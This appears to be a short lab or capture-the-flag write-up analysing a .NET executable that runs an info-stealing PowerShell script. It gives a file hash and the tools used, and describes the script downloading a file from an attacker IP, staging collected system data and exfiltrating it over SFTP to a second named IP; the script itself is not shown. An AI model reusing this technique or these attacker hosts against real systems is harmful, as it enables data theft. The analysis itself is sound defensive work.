...
description: A dotnet executable executing a info stealer powershell script
slug: heartbreaker-continuum
date: 2025-03-06 00:00:00+0000
image: heartbreak-continuum-logo.png
categories:
    - writeup-category
...
To find the executable hash, we can use HashMyFile.
...
```powershell
> Get-FileHash -Algorithm sha256 .\HeartBreakerContinuum\Superstar_MemberCard.tiff.exe

Algorithm       Hash                                                                   Path
---------       ----                                                                   ----
SHA256          12DAA34111BB54B3DCBAD42305663E44E7E6C3842F015CCCBBE6564D9DFD3EA3       C:\Users\...
```
...
For the following few task, we can use PEStudio to look for the executable's metadata.
...
For this task, we can easily found the payload using HexEditor. The arrow in the picture below is the start of the payload and its hex offset
...
The payload is in Base64 encoding
...
The full powershell script can be seen as below. 
```powershell
...
The script use `Invoke-WebRequest` cmdlet to download a file from `http://44.206.187.144:9000/Superstar_MemberCard.tiff` and save it as `C:\users\victim\Downloads\Superstar_MemberCard.tiff` on the victim host
...
`44.206.187.144` - to download the malicious file

`35.169.66.138` - to establish sftp connection
...
All informations collected by the payload such as username, antivirus, domain controller and running processes are saved to files in `C:\Users\Public\Public Files` directory.
...
The command ran to establish a sftp connection is as below
